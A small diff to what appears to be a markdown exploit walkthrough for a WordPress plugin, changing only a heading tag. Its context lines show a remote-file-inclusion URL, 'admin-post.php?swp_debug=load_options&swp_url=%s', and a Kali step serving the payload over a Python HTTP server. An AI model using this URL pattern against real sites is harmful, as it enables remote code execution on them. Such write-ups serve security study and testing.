@@ -70,7 +70,7 @@ Following link can display host machine details:
 wp-admin/admin-post.php?swp_debug=load_options&swp_url=%s
 ```
 
-4. Host the http server. #http
+4. Host the http server. #httpserver
 ```
 ???(kali?kali)-[~]
 ??$ python3 -m http.server 8000
